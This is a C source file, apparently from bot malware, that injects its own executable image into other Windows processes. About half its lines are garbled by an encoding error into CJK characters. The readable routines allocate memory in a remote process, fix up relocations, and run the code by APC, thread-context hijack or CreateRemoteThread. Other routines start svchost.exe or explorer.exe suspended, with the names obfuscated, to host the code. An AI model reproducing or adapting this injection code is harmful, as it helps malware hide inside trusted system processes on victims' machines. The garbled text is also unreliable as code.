#include <windows.h>਀⌀椀渀挀氀甀搀攀 㰀猀栀氀漀戀樀⸀栀㸀 
#include <tlhelp32.h>਀ 
#include "GetApi.h"਀⌀椀渀挀氀甀搀攀 ∀䴀攀洀漀爀礀⸀栀∀ 
#include "Strings.h"਀⌀椀渀挀氀甀搀攀 ∀唀琀椀氀猀⸀栀∀ 
#include "ntdll.h"਀⌀椀渀挀氀甀搀攀 ∀䤀渀樀攀挀琀⸀栀∀ 
#include "zdisasm.h"਀⌀椀渀挀氀甀搀攀 ∀䈀漀琀䐀攀戀甀最⸀栀∀ 
਀ 
#define MakePtr( cast, ptr, addValue ) (cast)( (DWORD_PTR)(ptr) + (DWORD_PTR)(addValue)) ਀⌀搀攀昀椀渀攀 䴀愀欀攀䐀攀氀琀愀⠀挀愀猀琀Ⰰ 砀Ⰰ 礀⤀ ⠀挀愀猀琀⤀ ⠀ ⠀䐀圀伀刀䐀开倀吀刀⤀⠀砀⤀ ⴀ ⠀䐀圀伀刀䐀开倀吀刀⤀⠀礀⤀⤀  
਀䐀圀伀刀䐀 搀眀一攀眀䈀愀猀攀 㴀 　㬀 
਀䐀圀伀刀䐀 䜀攀琀䤀洀愀最攀䈀愀猀攀㈀⠀⤀ 
{਀ऀ䐀圀伀刀䐀 搀眀刀攀琀 㴀 　㬀 
  /*	__asm਀ऀ笀 
			call getbase਀ऀऀ最攀琀戀愀猀攀㨀 
			pop eax਀ऀऀऀ愀渀搀 攀愀砀Ⰰ 　昀昀昀昀　　　　栀 
		find:਀ऀऀऀ挀洀瀀 眀漀爀搀 瀀琀爀 嬀 攀愀砀 崀Ⰰ 　砀㔀愀㐀搀 
			je end਀ऀऀऀ猀甀戀 攀愀砀Ⰰ 　　　㄀　　　　栀 
			jmp find਀ऀऀ攀渀搀㨀 
			mov [dwRet], eax਀ऀ紀 ⨀⼀ 
਀ऀ爀攀琀甀爀渀 搀眀刀攀琀㬀 
}਀ 
਀瘀漀椀搀 倀攀爀昀漀爀洀刀攀戀愀猀攀⠀ 䰀倀嘀伀䤀䐀 氀瀀䄀搀搀爀攀猀猀Ⰰ 䐀圀伀刀䐀 搀眀一攀眀䈀愀猀攀 ⤀ 
{਀ऀ倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀 瀀䐀䠀 㴀 ⠀倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀⤀氀瀀䄀搀搀爀攀猀猀㬀 
਀ऀ椀昀 ⠀ 瀀䐀䠀ⴀ㸀攀开洀愀最椀挀 ℀㴀 䤀䴀䄀䜀䔀开䐀伀匀开匀䤀䜀一䄀吀唀刀䔀 ⤀ 
	{਀ऀऀ爀攀琀甀爀渀㬀 
	}਀ 
	PIMAGE_NT_HEADERS pPE = (PIMAGE_NT_HEADERS) ((char *)pDH + pDH->e_lfanew);਀ 
	if ( pPE->Signature != IMAGE_NT_SIGNATURE )਀ऀ笀 
		return;਀ऀ紀 
਀ऀ䐀圀伀刀䐀 搀眀䐀攀氀琀愀 㴀 搀眀一攀眀䈀愀猀攀 ⴀ 瀀倀䔀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀䤀洀愀最攀䈀愀猀攀㬀 
਀ऀ䐀圀伀刀䐀 搀眀嘀愀 㴀 瀀倀䔀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀䐀愀琀愀䐀椀爀攀挀琀漀爀礀嬀䤀䴀䄀䜀䔀开䐀䤀刀䔀䌀吀伀刀夀开䔀一吀刀夀开䈀䄀匀䔀刀䔀䰀伀䌀崀⸀嘀椀爀琀甀愀氀䄀搀搀爀攀猀猀㬀 
	DWORD dwCb = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;਀ 
	PIMAGE_BASE_RELOCATION pBR = MakePtr( PIMAGE_BASE_RELOCATION, lpAddress, dwVa );਀ 
	UINT c = 0;਀ 
	while ( c < dwCb )਀ऀ笀 
		c += pBR->SizeOfBlock;਀ 
		int RelocCount = (pBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);਀ 
		LPVOID lpvBase = MakePtr(LPVOID, lpAddress, pBR->VirtualAddress);਀ 
		WORD *areloc = MakePtr(LPWORD, pBR, sizeof(IMAGE_BASE_RELOCATION));਀ 
		for ( int i = 0; i < RelocCount; i++ )਀ऀऀ笀 
			int type = areloc[i] >> 12;਀ 
			if ( !type )਀ऀऀऀ笀 
				continue;਀ऀऀऀ紀 
਀ऀऀऀ椀昀 ⠀ 琀礀瀀攀 ℀㴀 ㌀ ⤀ 
			{਀ऀऀऀऀ爀攀琀甀爀渀㬀 
			}਀ 
			int ofs = areloc[i] & 0x0fff;਀ 
			DWORD *pReloc = MakePtr( DWORD *, lpvBase, ofs );਀ 
			if ( *pReloc - pPE->OptionalHeader.ImageBase > pPE->OptionalHeader.SizeOfImage )਀ऀऀऀ笀 
				return;਀ऀऀऀ紀 
਀ऀऀऀ⨀瀀刀攀氀漀挀 ⬀㴀 搀眀䐀攀氀琀愀㬀 
		}਀ 
		pBR = MakePtr( PIMAGE_BASE_RELOCATION, pBR, pBR->SizeOfBlock );਀ऀ紀 
਀ऀ瀀倀䔀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀䤀洀愀最攀䈀愀猀攀 㴀 搀眀一攀眀䈀愀猀攀㬀 
਀ऀ爀攀琀甀爀渀㬀 
}਀ 
typedef struct ਀笀 
	WORD	Offset:12;਀ऀ圀伀刀䐀ऀ吀礀瀀攀㨀㐀㬀 
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;਀ 
void ProcessRelocs( PIMAGE_BASE_RELOCATION Relocs, DWORD ImageBase, DWORD Delta, DWORD RelocSize )਀笀 
	PIMAGE_BASE_RELOCATION Reloc = Relocs;਀ 
	while ( (DWORD)Reloc - (DWORD)Relocs < RelocSize ) ਀ऀ笀 
		if ( !Reloc->SizeOfBlock )਀ऀऀ笀 
			break;਀ऀऀ紀 
਀ऀऀ倀䤀䴀䄀䜀䔀开䘀䤀堀唀倀开䔀一吀刀夀 䘀椀砀甀瀀 㴀 ⠀倀䤀䴀䄀䜀䔀开䘀䤀堀唀倀开䔀一吀刀夀⤀⠀⠀唀䰀伀一䜀⤀刀攀氀漀挀 ⬀ 猀椀稀攀漀昀⠀䤀䴀䄀䜀䔀开䈀䄀匀䔀开刀䔀䰀伀䌀䄀吀䤀伀一⤀⤀㬀 
਀ऀऀ昀漀爀 ⠀ 唀䰀伀一䜀 爀 㴀 　㬀 爀 㰀 ⠀刀攀氀漀挀ⴀ㸀匀椀稀攀伀昀䈀氀漀挀欀 ⴀ 猀椀稀攀漀昀⠀䤀䴀䄀䜀䔀开䈀䄀匀䔀开刀䔀䰀伀䌀䄀吀䤀伀一⤀⤀ 㸀㸀 ㄀㬀 爀⬀⬀ ⤀  
		{਀ऀऀऀ䐀圀伀刀䐀 搀眀倀漀椀渀琀攀爀刀瘀愀 㴀 刀攀氀漀挀ⴀ㸀嘀椀爀琀甀愀氀䄀搀搀爀攀猀猀 ⬀ 䘀椀砀甀瀀ⴀ㸀伀昀昀猀攀琀㬀 
਀ऀऀऀ椀昀 ⠀ 䘀椀砀甀瀀ⴀ㸀吀礀瀀攀 㴀㴀 䤀䴀䄀䜀䔀开刀䔀䰀开䈀䄀匀䔀䐀开䠀䤀䜀䠀䰀伀圀 ⤀ 
			{਀ऀऀऀऀ⨀⠀倀唀䰀伀一䜀⤀⠀⠀唀䰀伀一䜀⤀䤀洀愀最攀䈀愀猀攀 ⬀ 搀眀倀漀椀渀琀攀爀刀瘀愀⤀ ⬀㴀 䐀攀氀琀愀㬀 
			}਀ 
			Fixup++;਀ऀऀ紀 
਀ऀऀ刀攀氀漀挀 㴀 ⠀倀䤀䴀䄀䜀䔀开䈀䄀匀䔀开刀䔀䰀伀䌀䄀吀䤀伀一⤀⠀ ⠀唀䰀伀一䜀⤀刀攀氀漀挀 ⬀ 刀攀氀漀挀ⴀ㸀匀椀稀攀伀昀䈀氀漀挀欀 ⤀㬀 
	}਀ 
	return;਀紀 
਀ 
਀䐀圀伀刀䐀 䤀渀樀攀挀琀䌀漀搀攀⠀ 䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀Ⰰ 䰀倀吀䠀刀䔀䄀䐀开匀吀䄀刀吀开刀伀唀吀䤀一䔀 氀瀀匀琀愀爀琀倀爀漀挀 ⤀ 
{਀ऀ䠀䴀伀䐀唀䰀䔀 栀䴀漀搀甀氀攀 㴀 ⠀䠀䴀伀䐀唀䰀䔀⤀䜀攀琀䤀洀愀最攀䈀愀猀攀⠀氀瀀匀琀愀爀琀倀爀漀挀⤀㬀 
਀ऀ倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀 瀀䐀䠀 㴀 ⠀倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀⤀栀䴀漀搀甀氀攀㬀 
	PIMAGE_NT_HEADERS pPE = (PIMAGE_NT_HEADERS) ((LPSTR)pDH + pDH->e_lfanew);਀ 
	DWORD dwSize = pPE->OptionalHeader.SizeOfImage;਀ 
	LPVOID lpNewAddr = MemAlloc( dwSize );਀ 
	if ( lpNewAddr == NULL )਀ऀ笀 
		return -1;਀ऀ紀 
਀ऀ洀开洀攀洀挀瀀礀⠀ 氀瀀一攀眀䄀搀搀爀Ⰰ 栀䴀漀搀甀氀攀Ⰰ 搀眀匀椀稀攀 ⤀㬀 
਀ऀ䰀倀嘀伀䤀䐀 氀瀀一攀眀䴀漀搀甀氀攀 㴀 一唀䰀䰀㬀 
਀ऀ䐀圀伀刀䐀 搀眀䄀搀搀爀 㴀 ⴀ㄀㬀 
	HMODULE hNewModule = NULL;਀ 
	if ( (NTSTATUS)pZwAllocateVirtualMemory( hProcess, &lpNewModule, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) == STATUS_SUCCESS )਀ऀ笀 
		hNewModule = (HMODULE)lpNewModule;	਀ 
		ULONG RelRVA   = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;਀ऀऀ唀䰀伀一䜀 刀攀氀匀椀稀攀  㴀 瀀倀䔀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀䐀愀琀愀䐀椀爀攀挀琀漀爀礀嬀䤀䴀䄀䜀䔀开䐀䤀刀䔀䌀吀伀刀夀开䔀一吀刀夀开䈀䄀匀䔀刀䔀䰀伀䌀崀⸀匀椀稀攀㬀 
਀ऀऀ倀爀漀挀攀猀猀刀攀氀漀挀猀⠀ ⠀倀䤀䴀䄀䜀䔀开䈀䄀匀䔀开刀䔀䰀伀䌀䄀吀䤀伀一⤀⠀ ⠀䐀圀伀刀䐀⤀栀䴀漀搀甀氀攀 ⬀ 刀攀氀刀嘀䄀 ⤀Ⰰ ⠀䐀圀伀刀䐀⤀氀瀀一攀眀䄀搀搀爀Ⰰ ⠀䐀圀伀刀䐀⤀栀一攀眀䴀漀搀甀氀攀 ⴀ ⠀䐀圀伀刀䐀⤀栀䴀漀搀甀氀攀Ⰰ 刀攀氀匀椀稀攀 ⤀㬀ऀऀ 
਀ऀऀ搀眀一攀眀䈀愀猀攀 㴀 ⠀䐀圀伀刀䐀⤀栀一攀眀䴀漀搀甀氀攀㬀 
਀ऀऀ椀昀 ⠀ ⠀一吀匀吀䄀吀唀匀⤀瀀娀眀圀爀椀琀攀嘀椀爀琀甀愀氀䴀攀洀漀爀礀⠀ 栀倀爀漀挀攀猀猀Ⰰ   栀一攀眀䴀漀搀甀氀攀Ⰰ 氀瀀一攀眀䄀搀搀爀Ⰰ 搀眀匀椀稀攀Ⰰ 一唀䰀䰀 ⤀ 㴀㴀 匀吀䄀吀唀匀开匀唀䌀䌀䔀匀匀 ⤀ 
		{਀ऀऀऀ搀眀䄀搀搀爀 㴀 ⠀䐀圀伀刀䐀⤀氀瀀匀琀愀爀琀倀爀漀挀 ⴀ ⠀䐀圀伀刀䐀⤀栀䴀漀搀甀氀攀 ⬀ ⠀䐀圀伀刀䐀⤀栀一攀眀䴀漀搀甀氀攀㬀 
		}਀ऀ紀 
਀ऀ䐀圀伀刀䐀 搀眀伀氀搀倀爀漀琀攀挀琀 㴀 　㬀 
	pZwProtectVirtualMemory( hProcess, (PVOID*)&hNewModule, &dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect );਀ऀ 
	MemFree( lpNewAddr );਀ऀ 
	return dwAddr;਀紀 
਀ 
//---------------------------------------------------਀⼀⼀  ␀䌄㴄㨄䘄㠄伄 㠀㴄㘄㔄㨄䈄㠄䈄 㸀㄄䀄〄㜄 ㈀ 䌀㨄〄㜄〄㴄㴄䬄㤄 㼀䀄㸄䘄㔄䄄䄄
//---------------------------------------------------਀戀漀漀氀 䤀渀樀攀挀琀䌀漀搀攀㈀⠀ 䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀Ⰰ 䠀䄀一䐀䰀䔀 栀吀栀爀攀愀搀Ⰰ 吀䤀渀樀攀挀琀䘀甀渀挀琀椀漀渀 昀开䴀愀椀渀⤀ 
{਀ऀ䐀圀伀刀䐀 搀眀䈀愀猀攀 㴀 ⠀䐀圀伀刀䐀⤀䜀攀琀䤀洀愀最攀䈀愀猀攀⠀昀开䴀愀椀渀⤀㬀 
	DWORD dwSize = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE *)(dwBase) + ((PIMAGE_DOS_HEADER)(dwBase))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;਀ 
	HANDLE hMap = pCreateFileMappingA( (HANDLE)-1, NULL, PAGE_EXECUTE_READWRITE, 0, dwSize, NULL );਀ 
    LPVOID lpView = pMapViewOfFile( hMap, FILE_MAP_WRITE, 0, 0, 0 );਀ 
	if ( lpView == NULL )਀ऀ笀 
		return false;਀ऀ紀 
਀ऀ洀开洀攀洀挀瀀礀⠀ 氀瀀嘀椀攀眀Ⰰ ⠀䰀倀嘀伀䤀䐀⤀搀眀䈀愀猀攀Ⰰ 搀眀匀椀稀攀 ⤀㬀 
਀ऀ䐀圀伀刀䐀 搀眀嘀椀攀眀匀椀稀攀    㴀 　㬀 
	DWORD dwNewBaseAddr = 0;਀ऀ戀漀漀氀 刀攀猀甀氀琀 㴀 昀愀氀猀攀㬀 
਀ऀ一吀匀吀䄀吀唀匀 匀琀愀琀甀猀 㴀 ⠀一吀匀吀䄀吀唀匀⤀瀀娀眀䴀愀瀀嘀椀攀眀伀昀匀攀挀琀椀漀渀⠀ 栀䴀愀瀀Ⰰ 栀倀爀漀挀攀猀猀Ⰰ ⠀倀嘀伀䤀䐀⨀⤀☀搀眀一攀眀䈀愀猀攀䄀搀搀爀Ⰰ 　Ⰰ 搀眀匀椀稀攀Ⰰ 一唀䰀䰀Ⰰ ☀搀眀嘀椀攀眀匀椀稀攀Ⰰ ⠀匀䔀䌀吀䤀伀一开䤀一䠀䔀刀䤀吀⤀㄀Ⰰ 　Ⰰ 倀䄀䜀䔀开䔀堀䔀䌀唀吀䔀开刀䔀䄀䐀圀刀䤀吀䔀 ⤀㬀 
਀ऀ椀昀 ⠀ 匀琀愀琀甀猀 㴀㴀 匀吀䄀吀唀匀开匀唀䌀䌀䔀匀匀 ⤀ 
	{਀ऀऀ倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀 搀䠀攀愀搀攀爀   㴀 ⠀倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀⤀搀眀䈀愀猀攀㬀 
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)RVATOVA(dwBase, dHeader->e_lfanew);਀ 
		ULONG RelRVA   = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;਀ऀऀ唀䰀伀一䜀 刀攀氀匀椀稀攀  㴀 渀琀䠀攀愀搀攀爀猀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀䐀愀琀愀䐀椀爀攀挀琀漀爀礀嬀䤀䴀䄀䜀䔀开䐀䤀刀䔀䌀吀伀刀夀开䔀一吀刀夀开䈀䄀匀䔀刀䔀䰀伀䌀崀⸀匀椀稀攀㬀 
਀ऀऀ倀爀漀挀攀猀猀刀攀氀漀挀猀⠀ ⠀倀䤀䴀䄀䜀䔀开䈀䄀匀䔀开刀䔀䰀伀䌀䄀吀䤀伀一⤀⠀ ⠀䰀倀䈀夀吀䔀⤀搀眀䈀愀猀攀 ⬀ 刀攀氀刀嘀䄀 ⤀Ⰰ ⠀䐀圀伀刀䐀⤀氀瀀嘀椀攀眀Ⰰ 搀眀一攀眀䈀愀猀攀䄀搀搀爀 ⴀ 搀眀䈀愀猀攀Ⰰ 刀攀氀匀椀稀攀 ⤀㬀 
਀ऀऀ䐀圀伀刀䐀 搀眀䄀搀搀爀 㴀 ⠀䐀圀伀刀䐀⤀昀开䴀愀椀渀 ⴀ 搀眀䈀愀猀攀 ⬀ 搀眀一攀眀䈀愀猀攀䄀搀搀爀㬀 
਀ऀऀ匀琀愀琀甀猀 㴀 ⠀一吀匀吀䄀吀唀匀⤀瀀娀眀儀甀攀甀攀䄀瀀挀吀栀爀攀愀搀⠀ 栀吀栀爀攀愀搀Ⰰ ⠀倀䬀一伀刀䴀䄀䰀开刀伀唀吀䤀一䔀⤀搀眀䄀搀搀爀Ⰰ 一唀䰀䰀Ⰰ 一唀䰀䰀Ⰰ 一唀䰀䰀 ⤀㬀 
		if (Status == STATUS_SUCCESS)਀ऀऀ笀 
			Status = (NTSTATUS)pZwResumeThread( (DWORD)hThread, NULL );਀ऀऀऀ刀攀猀甀氀琀 㴀 ⠀匀琀愀琀甀猀 㴀㴀 匀吀䄀吀唀匀开匀唀䌀䌀䔀匀匀⤀㬀 
		}਀ऀऀ攀氀猀攀 
		{਀ऀऀऀ瀀吀攀爀洀椀渀愀琀攀吀栀爀攀愀搀⠀ 栀吀栀爀攀愀搀Ⰰ 　 ⤀㬀 
		}਀ऀ紀 
਀ऀ瀀唀渀洀愀瀀嘀椀攀眀伀昀䘀椀氀攀⠀ 氀瀀嘀椀攀眀 ⤀㬀 
    pCloseHandle( hMap );਀ 
	return Result;਀紀 
਀戀漀漀氀 䤀渀樀攀挀琀䌀漀搀攀㌀⠀ 䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀Ⰰ 䠀䄀一䐀䰀䔀 栀吀栀爀攀愀搀Ⰰ 䐀圀伀刀䐀 ⠀圀䤀一䄀倀䤀 昀开䴀愀椀渀⤀⠀䰀倀嘀伀䤀䐀⤀ ⤀ 
{਀ऀ䐀圀伀刀䐀 搀眀䄀搀搀爀 㴀 䤀渀樀攀挀琀䌀漀搀攀⠀ 栀倀爀漀挀攀猀猀Ⰰ 昀开䴀愀椀渀 ⤀㬀 
਀ऀ椀昀 ⠀ 搀眀䄀搀搀爀 ℀㴀 ⴀ㄀ ⤀ 
	{਀ऀऀ䌀伀一吀䔀堀吀 䌀漀渀琀攀砀琀㬀 
਀ऀऀ洀开洀攀洀猀攀琀⠀ ☀䌀漀渀琀攀砀琀Ⰰ 　Ⰰ 猀椀稀攀漀昀⠀ 䌀伀一吀䔀堀吀 ⤀ ⤀㬀 
਀ऀऀ䌀漀渀琀攀砀琀⸀䌀漀渀琀攀砀琀䘀氀愀最猀 㴀 䌀伀一吀䔀堀吀开䤀一吀䔀䜀䔀刀㬀 
		Context.Eax			 = dwAddr;਀ 
		DWORD dwBytes = 0;਀ 
        pWriteProcessMemory( hProcess,(LPVOID)( Context.Ebx + 8 ), &dwNewBase, 4, &dwBytes );਀        瀀娀眀匀攀琀䌀漀渀琀攀砀琀吀栀爀攀愀搀⠀ 栀吀栀爀攀愀搀Ⰰ ☀䌀漀渀琀攀砀琀 ⤀㬀 
        pZwResumeThread( (DWORD)hThread, NULL );਀ऀ紀 
਀ऀ爀攀琀甀爀渀 琀爀甀攀㬀 
}਀ 
//਀戀漀漀氀 䤀渀樀攀挀琀䌀漀搀攀㐀⠀ 䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀Ⰰ 䐀圀伀刀䐀 ⠀圀䤀一䄀倀䤀 昀开䴀愀椀渀⤀⠀䰀倀嘀伀䤀䐀⤀ ⤀ 
{਀ऀ䐀圀伀刀䐀 搀眀䈀愀猀攀 㴀 ⠀䐀圀伀刀䐀⤀䜀攀琀䤀洀愀最攀䈀愀猀攀⠀昀开䴀愀椀渀⤀㬀 
	DWORD dwSize = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE *)(dwBase) + ((PIMAGE_DOS_HEADER)(dwBase))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;਀ 
	HANDLE hMap = pCreateFileMappingA( (HANDLE)-1, NULL, PAGE_EXECUTE_READWRITE, 0, dwSize, NULL );਀ 
    LPVOID lpView = pMapViewOfFile( hMap, FILE_MAP_WRITE, 0, 0, 0 );਀ 
	if ( lpView == NULL )਀ऀ笀 
		return false;਀ऀ紀 
਀ऀ洀开洀攀洀挀瀀礀⠀ 氀瀀嘀椀攀眀Ⰰ ⠀䰀倀嘀伀䤀䐀⤀搀眀䈀愀猀攀Ⰰ 搀眀匀椀稀攀 ⤀㬀 
਀ऀ䐀圀伀刀䐀 搀眀嘀椀攀眀匀椀稀攀    㴀 　㬀 
	DWORD dwNewBaseAddr = 0;਀ऀ戀漀漀氀 刀攀猀甀氀琀 㴀 昀愀氀猀攀㬀 
਀ऀ一吀匀吀䄀吀唀匀 匀琀愀琀甀猀 㴀 ⠀一吀匀吀䄀吀唀匀⤀瀀娀眀䴀愀瀀嘀椀攀眀伀昀匀攀挀琀椀漀渀⠀ 栀䴀愀瀀Ⰰ 栀倀爀漀挀攀猀猀Ⰰ ⠀倀嘀伀䤀䐀⨀⤀☀搀眀一攀眀䈀愀猀攀䄀搀搀爀Ⰰ 　Ⰰ 搀眀匀椀稀攀Ⰰ 一唀䰀䰀Ⰰ ☀搀眀嘀椀攀眀匀椀稀攀Ⰰ ⠀匀䔀䌀吀䤀伀一开䤀一䠀䔀刀䤀吀⤀㄀Ⰰ 　Ⰰ 倀䄀䜀䔀开䔀堀䔀䌀唀吀䔀开刀䔀䄀䐀圀刀䤀吀䔀 ⤀㬀 
਀ऀ椀昀 ⠀ 匀琀愀琀甀猀 㴀㴀 匀吀䄀吀唀匀开匀唀䌀䌀䔀匀匀 ⤀ 
	{		਀ऀऀ倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀 搀䠀攀愀搀攀爀   㴀 ⠀倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀⤀搀眀䈀愀猀攀㬀 
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)RVATOVA(dwBase, dHeader->e_lfanew);਀ 
		ULONG RelRVA   = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;਀ऀऀ唀䰀伀一䜀 刀攀氀匀椀稀攀  㴀 渀琀䠀攀愀搀攀爀猀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀䐀愀琀愀䐀椀爀攀挀琀漀爀礀嬀䤀䴀䄀䜀䔀开䐀䤀刀䔀䌀吀伀刀夀开䔀一吀刀夀开䈀䄀匀䔀刀䔀䰀伀䌀崀⸀匀椀稀攀㬀 
਀ऀऀ倀爀漀挀攀猀猀刀攀氀漀挀猀⠀ ⠀倀䤀䴀䄀䜀䔀开䈀䄀匀䔀开刀䔀䰀伀䌀䄀吀䤀伀一⤀⠀ 搀眀䈀愀猀攀 ⬀ 刀攀氀刀嘀䄀 ⤀Ⰰ ⠀䐀圀伀刀䐀⤀氀瀀嘀椀攀眀Ⰰ 搀眀一攀眀䈀愀猀攀䄀搀搀爀 ⴀ 搀眀䈀愀猀攀Ⰰ 刀攀氀匀椀稀攀 ⤀㬀ऀऀ 
਀ऀऀ䐀圀伀刀䐀 搀眀䄀搀搀爀 㴀 ⠀䐀圀伀刀䐀⤀昀开䴀愀椀渀 ⴀ 搀眀䈀愀猀攀 ⬀ 搀眀一攀眀䈀愀猀攀䄀搀搀爀㬀 
਀ऀऀ⼀⼀瀀娀眀刀攀猀甀洀攀吀栀爀攀愀搀⠀ 栀吀栀爀攀愀搀Ⰰ 一唀䰀䰀 ⤀㬀 
		DWORD id;਀ 
		if (pCreateRemoteThread(hProcess, NULL,0,(LPTHREAD_START_ROUTINE)dwAddr,NULL,0,&id) )਀ऀऀऀ刀攀猀甀氀琀 㴀 琀爀甀攀㬀 
	}਀ 
	pUnmapViewOfFile( lpView );਀ऀ瀀䌀氀漀猀攀䠀愀渀搀氀攀⠀ 栀䴀愀瀀 ⤀㬀 
਀ऀ爀攀琀甀爀渀 刀攀猀甀氀琀㬀 
}਀ 
bool CreateSvchost( PHANDLE hProcess, PHANDLE hThread )਀笀 
	WCHAR Svchost[] = {'s','v','c','h','o','s','t','.','e','x','e',0};਀ऀ圀䌀䠀䄀刀 䄀爀最猀嬀崀ऀ㴀 笀✀ⴀ✀Ⰰ✀欀✀Ⰰ✀ ✀Ⰰ✀渀✀Ⰰ✀攀✀Ⰰ✀琀✀Ⰰ✀猀✀Ⰰ✀瘀✀Ⰰ✀挀✀Ⰰ✀猀✀Ⰰ　紀㬀 
਀ऀ圀䌀䠀䄀刀 ⨀匀礀猀倀愀琀栀 㴀 ⠀圀䌀䠀䄀刀⨀⤀䴀攀洀䄀氀氀漀挀⠀ 㔀㄀㈀ ⤀㬀 
਀ऀ椀昀 ⠀ ℀匀礀猀倀愀琀栀 ⤀ 
	{਀ऀऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
	}਀ 
	pGetSystemDirectoryW( SysPath, 512 );਀ 
	plstrcatW( SysPath, L"\\" );਀ऀ瀀氀猀琀爀挀愀琀圀⠀ 匀礀猀倀愀琀栀Ⰰ 匀瘀挀栀漀猀琀 ⤀㬀 
਀ऀ倀刀伀䌀䔀匀匀开䤀一䘀伀刀䴀䄀吀䤀伀一 瀀椀㬀 
	STARTUPINFOW si;਀ 
	m_memset( &si, 0, sizeof( STARTUPINFOW ) );		਀ऀ猀椀⸀挀戀ऀ㴀 猀椀稀攀漀昀⠀ 匀吀䄀刀吀唀倀䤀一䘀伀圀 ⤀㬀 
਀ऀ戀漀漀氀 爀攀琀 㴀 昀愀氀猀攀㬀 
	਀ऀ椀昀⠀ ⠀䈀伀伀䰀⤀瀀䌀爀攀愀琀攀倀爀漀挀攀猀猀圀⠀ 匀礀猀倀愀琀栀Ⰰ 䄀爀最猀Ⰰ 　Ⰰ 　Ⰰ 吀刀唀䔀Ⰰ 䌀刀䔀䄀吀䔀开匀唀匀倀䔀一䐀䔀䐀Ⰰ 　Ⰰ 　Ⰰ ☀猀椀Ⰰ ☀瀀椀 ⤀ ⤀ 
	{਀ऀऀ⨀栀倀爀漀挀攀猀猀 㴀 瀀椀⸀栀倀爀漀挀攀猀猀㬀 
		*hThread  = pi.hThread;਀ 
		ret = true;਀ऀ紀 
਀ऀ䴀攀洀䘀爀攀攀⠀ 匀礀猀倀愀琀栀 ⤀㬀 
	return ret;਀紀 
਀戀漀漀氀 䌀爀攀愀琀攀䔀砀瀀氀漀爀攀爀⠀ 倀䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀Ⰰ 倀䠀䄀一䐀䰀䔀 栀吀栀爀攀愀搀 ⤀ 
{਀ऀ圀䌀䠀䄀刀 䔀砀瀀氀漀爀攀爀嬀崀 㴀 笀✀攀✀Ⰰ✀砀✀Ⰰ✀瀀✀Ⰰ✀氀✀Ⰰ✀漀✀Ⰰ✀爀✀Ⰰ✀攀✀Ⰰ✀爀✀Ⰰ✀⸀✀Ⰰ✀攀✀Ⰰ✀砀✀Ⰰ✀攀✀Ⰰ　紀㬀 
਀ऀ圀䌀䠀䄀刀 ⨀匀礀猀倀愀琀栀 㴀 ⠀圀䌀䠀䄀刀⨀⤀䴀攀洀䄀氀氀漀挀⠀ 㔀㄀㈀ ⤀㬀 
਀ऀ椀昀 ⠀ 匀礀猀倀愀琀栀 㴀㴀 一唀䰀䰀 ⤀ 
	{਀ऀऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
	}਀ 
	pGetWindowsDirectoryW( SysPath, 512 );਀ 
	plstrcatW( SysPath, L"\\" );਀ऀ瀀氀猀琀爀挀愀琀圀⠀ 匀礀猀倀愀琀栀Ⰰ 䔀砀瀀氀漀爀攀爀 ⤀㬀 
਀ 
	HANDLE hTmpProcess = NULL;਀ऀ䠀䄀一䐀䰀䔀 栀吀洀瀀吀栀爀攀愀搀  㴀 一唀䰀䰀㬀 
਀ऀ戀漀漀氀 爀攀琀 㴀 刀甀渀䘀椀氀攀䔀砀⠀ 匀礀猀倀愀琀栀Ⰰ 䌀刀䔀䄀吀䔀开匀唀匀倀䔀一䐀䔀䐀Ⰰ ☀栀吀洀瀀倀爀漀挀攀猀猀Ⰰ ☀栀吀洀瀀吀栀爀攀愀搀 ⤀㬀 
਀ऀ椀昀 ⠀ 爀攀琀 ⤀ 
	{਀ऀऀ⨀栀倀爀漀挀攀猀猀 㴀 栀吀洀瀀倀爀漀挀攀猀猀㬀 
		*hThread  = hTmpThread;਀ऀ紀 
਀ऀ䴀攀洀䘀爀攀攀⠀匀礀猀倀愀琀栀⤀㬀 
਀ऀ爀攀琀甀爀渀 爀攀琀㬀 
